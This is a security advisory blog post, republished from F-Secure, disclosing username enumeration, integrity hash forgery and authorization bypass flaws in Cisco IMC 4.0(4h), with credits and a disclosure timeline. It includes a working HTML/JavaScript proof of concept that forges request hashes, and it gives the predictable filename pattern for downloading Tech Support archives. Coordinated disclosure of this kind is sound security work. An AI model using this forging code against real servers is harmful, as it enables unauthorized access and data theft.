---
layout: post
title: 'Cisco IMC Server: Multiple Vulnerabilities'
excerpt: "Several vulnerabilities were discovered by F-Secure Consulting in the Cisco Integrated Management Controller (IMC) web application. The vulnerabilities combined can be leveraged to enumerate users and bypass authorisation controls.<br/><br/>"
categories:
  - "cve-advisory"
tags:
  - appsec
  - pentesting
  - cisco
  - "imc server"
last_modified_at: 2021-12-24T14:44:00
post-img: assets/img/cisco-xpand.jpeg
---

{% include note.html content="This advisory was originally published on [F-Secure LABS](https://labs.f-secure.com/advisories/cisco-imc-server-multiple-vulnerabilities/)" %}

| **Product** | Cisco IMC Server 4.0(4h) |
| **Severity** |<span style="color:orange">Medium</span> |
| **CVE IDs** |CVE-2020-26062, CVE-2020-26063 |
| **Type**	| Authorization Bypass, Username Enumeration |

<br/><br/>

{% include toc.html %}

## Introduction

Several vulnerabilities were discovered by F-Secure Consulting in the Cisco Integrated Management Controller (IMC) web application (CVE-2020-26062, CVE-2020-26063 and CSCvv07284). An example datasheet of the product can be found [here](https://www.cisco.com/c/en/us/products/collateral/servers-unified-computing/ucs-b-series-blade-servers/data_sheet_c78-728802.html).

The vulnerabilities combined can be leveraged to enumerate users and bypass authorisation controls. 


## Vulnerabilities Discovered

Three security issues were identified affecting the IMC application version 4.0(4h) and potentially other versions. The complete range of products affected can be found on the relevant Cisco Pages:

* Cisco Integrated Management Controller Software Username Enumeration Vulnerability<br/>[https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-enum-CyheP3B7](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-enum-CyheP3B7)

* Cisco Integrated Management Controller API Request Hash Modification<br/>[http://bst.cloudapps.cisco.com/bugsearch/bug/CSCvv07284](http://bst.cloudapps.cisco.com/bugsearch/bug/CSCvv07284)

* Cisco Integrated Management Controller Software Authorization Bypass Vulnerability<br/>[https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-auth-zWkppJxL](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-auth-zWkppJxL)


**Username Enumeration**
> CVE-2020-26062 - CVSSv3.1 Score: 5.3

The Username Enumeration vulnerability was discovered within the log in page of the IMC web interface. In its default configuration, there is no account lockout threshold enforced; offering the opportunity for an adversary to brute-force enumerated accounts.


**Integrity Hash Forgery**
> CCSCvv07284 - CVSSv3.1 Score: 3.1

Once authenticated to the application communications with the server consist of HTTP POST requests sent to a set of XML-based APIs. These API calls use an integrity protection scheme. User supplied parameter values are hashed and the resulting value is placed in the `CPSG_VAR HTTP` header. The hashing functionality is implemented in client-side JavaScript. 

The JavaScript hashing code was re-implemented in the form of an an HTML page. The source code is presented below:

```html
<html>
 <body>
   <head>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>   
       <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/hmac-sha256.min.js"></script>       
       <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/enc-base64.min.js"></script>  
   </head>

   <script>
     function invoke(){
       var sessionCookie = document.getElementById('sessionCookie').value
       var sessionID = document.getElementById('sessionID').value
       var queryStringURL = document.getElementById('queryString').value 
       var queryString = decodeURIComponent(decodeURIComponent(queryStringURL))
       var hash = hashFnv32(sessionID,queryString)      
       document.getElementById('output').innerHTML = hash
       document.getElementById('http').innerHTML = `
       POST /data HTTP/1.1<br>
       Host: <IPaddress><br>
       Referer: https://<IPaddress>/index.html<br>
       CSPG_VAR: ` + hash + `<br>
       Content-Type: application/x-www-form-urlencoded<br>
       Cookie: username=; sessionCookie=` + sessionCookie +`<br>
       Content-Length: 105<br><br>
       sessionID=`+sessionID+`&queryString=`+queryStringURL+`<br>`
    }

     function hashFnv32(a, b) {
           console.log("hashFnv32("+a+","+b+") called") 
           var d, e = 40389;
           var g = Math.floor(a.length / 4);
           for (d = 0; d < g; d++) e ^= a.charCodeAt(d), e += e << 1;
           a = e.toString();
           var ret = CryptoJS.HmacSHA512(b,a).toString()
           console.log("hashFnv32 returns "+ ret)
           return ret
      }
   </script>


   <form action="#">
     <p>sessionCookie</p>
     <input type="text" id="sessionCookie" />
     <p>sessionID</p>
     <input type="text" id="sessionID" />
     <p>queryString (double urlencoded)</p>
     <input type="text" id="queryString" />
     <input  type="button" value="Hash!" />
   </form>
   <div id="output"></div>
   <br><br>
   <div id="http"></div>
 </body>
</html>
```

The screenshot below illustrates its use to generate valid requests that will pass integrity checks.

![](/assets/img/cisco-imc-hash-forgery.png)


**Authorization Bypass**
> CVE-2020-26063 - CVSSv3.1 Score: 5.4

Authorisation checks were improperly configured and/or found to be missing on 2 of the IMC API endpoints. It is possible to forge a request using the Integrity Hash Forgery (CCSCvv07284) issue that results in the execution of functionality that is not normally available to some users, such as those with "read-only" roles, for example the "ping" and "set SSH server banner" functions.

The application also supports the generation of "Tech Support" archives by administrator users. The archives contain configuration files, detailed runtime logs and full directories from the server’s filesystem. If the filename can be 'guessed' it can be downloaded directly e.g. `/data/saveTechSupportWithHostname(<imc-hostname>-20200714-161002.tar.gz)`. The file is generated in a predictable format: `[IMC hostname]-[YYYYMMDD]-[HHMMSS].tar.gz`. Once the file is requested it is immediately deleted from the server, limiting the attacker’s window of opportunity. 


## Credit

The issues were discovered by Leonidas Tsaousis ([@laripping](https://twitter.com/laripping)) and Thomas Large of F-Secure Consulting.



## Timeline

| Date |	Summary |
| ---- |  ------- |
| 20/07/2020 | Issues disclosed to Cisco PSIRT | 
| 20/07/2020 | Cisco PSIRT acknowledged receipt of the report | 
| 05/08/2020 | Cisco triaged and reproduced the issues |
| 28/09/2020 | Confirmation of remediation plan, agreement of join disclosure date |
| 04/11/2020 | Joint disclosure by Cisco and F-Secure, Advisory released |
